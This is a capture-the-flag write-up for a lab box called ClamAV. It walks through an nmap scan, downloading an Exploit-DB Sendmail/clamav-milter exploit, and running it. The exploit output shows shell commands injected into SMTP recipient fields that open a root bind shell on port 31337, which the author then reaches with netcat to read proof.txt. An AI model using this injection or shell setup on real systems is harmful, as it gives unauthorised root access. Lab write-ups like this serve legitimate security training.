# CTF Writeup: ClamAV

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.175.42 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:37 EST
Nmap scan report for 192.168.175.42
Host is up (0.023s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.164], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ph33r
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=12/8%OT=22%CT=1%CU=32880%PV=Y%DS=4%DC=T%G=Y%TM=69378BC
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=C7%GCD=1%ISR=CB%TI=Z%CI=Z%II=I%TS=A)SEQ(S
OS:P=CA%GCD=1%ISR=C8%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=CA%GCD=1%ISR=CC%TI=Z%CI=Z%I
OS:I=I%TS=A)SEQ(SP=CC%GCD=1%ISR=CD%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=CE%GCD=1%ISR=
OS:D0%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW0%O2=M578ST11NW0%O3=M578NNT11NW0
OS:%O4=M578ST11NW0%O5=M578ST11NW0%O6=M578ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W
OS:4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M578NNSNW0%CC=N%Q=)T1(
OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h29m59s, deviation: 3h32m08s, median: 4h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-09T02:38:25-05:00

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   26.97 ms 192.168.45.1
2   26.90 ms 192.168.45.254
3   26.99 ms 192.168.251.1
4   27.08 ms 192.168.175.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.83 seconds
```

## Vulnerability Assessment

Since the smtp server revealed the running application & version, I immediatly searched up for CVE's on this application and found an RCE PoC. 

```
wget https://www.exploit-db.com/raw/4761
```

## Initial Access & Priv Esc

This exploit runs commands on the server with root rights and compromised the server creating an service/port running on
31337.


```
perl 4761.pl 192.168.183.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.183.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 16 Dec 2025 02:41:34 -0500; (No UCE/UBE) logging access from: [192.168.45.229](FAIL)-[192.168.45.229]
250-localhost.localdomain Hello [192.168.45.229], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 5BG7fYHG004262 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

After running the exploit, we can see that the service is indeed up & running.

```
nmap -p 31337 192.168.183.42                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 21:41 EST
Nmap scan report for 192.168.183.42
Host is up (0.035s latency).

PORT      STATE SERVICE
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

Let's connect to it utilizing netcat.

```
nc 192.168.183.42 31337
```

We gained an shell as root and retrieved the proof.txt in the /root directory.

```
nc 192.168.183.42 31337     
whoami
root
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
21e4616c3f2abc173c978060840dbeb4
```
